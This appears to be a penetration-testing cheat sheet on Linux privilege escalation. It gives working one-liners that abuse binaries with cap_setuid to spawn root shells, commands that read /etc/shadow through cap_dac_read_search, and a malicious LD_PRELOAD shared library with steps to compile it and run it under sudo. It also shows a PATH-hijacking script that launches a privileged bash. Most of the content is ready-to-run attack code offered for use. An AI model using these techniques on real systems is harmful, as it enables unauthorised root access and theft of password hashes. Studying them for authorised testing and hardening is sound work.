# Linux Capabilities, LD_PRELOAD & PATH Hijacking

!!! tip ""
    Run `getcap -r / 2>/dev/null` and check `sudo -l` for `env_keep+=LD_PRELOAD` early in enumeration — these are frequently misconfigured and give root without touching SUID binaries or cron jobs.

---

## Linux Capabilities

Capabilities grant specific elevated privileges to individual binaries without making them full SUID. Enumerate all:

```bash
getcap -r / 2>/dev/null
```

### `cap_setuid` — set arbitrary UID (root)

```bash
# Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'

# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

### `cap_dac_read_search` — read any file regardless of permissions

```bash
# Read /etc/shadow directly if a tool has this capability
python3 -c 'print(open("/etc/shadow").read())'

# Or with tar
tar -cvf /dev/null /etc/shadow 2>/dev/null | tar -xvf - -O
```

### `cap_net_raw` — raw socket access

A binary with this capability can sniff network traffic. Useful for credential capture on shared network segments.

### `cap_sys_ptrace` — attach to any process

Can be used to inject shellcode into a root-owned process:

```bash
gdb -p <root-process-pid>
```

!!! tip ""
    GTFOBins has a Capabilities section for common binaries — check there before writing custom exploit code.

---

## LD_PRELOAD Hijacking

If `sudo -l` shows `env_keep+=LD_PRELOAD`, you can inject a malicious shared library into any sudo-allowed binary.

### Check for the condition

```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD
```

### Compile the malicious library

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
```

### Exploit

```bash
sudo LD_PRELOAD=/tmp/shell.so <any-sudo-allowed-command>
```

---

## PATH Hijacking

A SUID binary or sudo script that calls a command using a relative path (e.g., `service apache2 restart` without `/usr/sbin/service`) is vulnerable if you can write to a directory earlier in `$PATH`.

### Find the vulnerable call

```bash
strings /usr/local/bin/target-binary | grep -v "/"
strace -e execve /usr/local/bin/target-binary 2>&1 | grep exec
ltrace /usr/local/bin/target-binary 2>&1
```

### Exploit

```bash
# Create a malicious replacement command
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Prepend your directory to PATH
export PATH=/tmp:$PATH

# Run the vulnerable binary
/usr/local/bin/target-binary
```

!!! warning "Watch out"
    PATH hijacking only works when the vulnerable binary runs with elevated privileges. Confirm with `ls -lah /usr/local/bin/target-binary` before spending time on it.
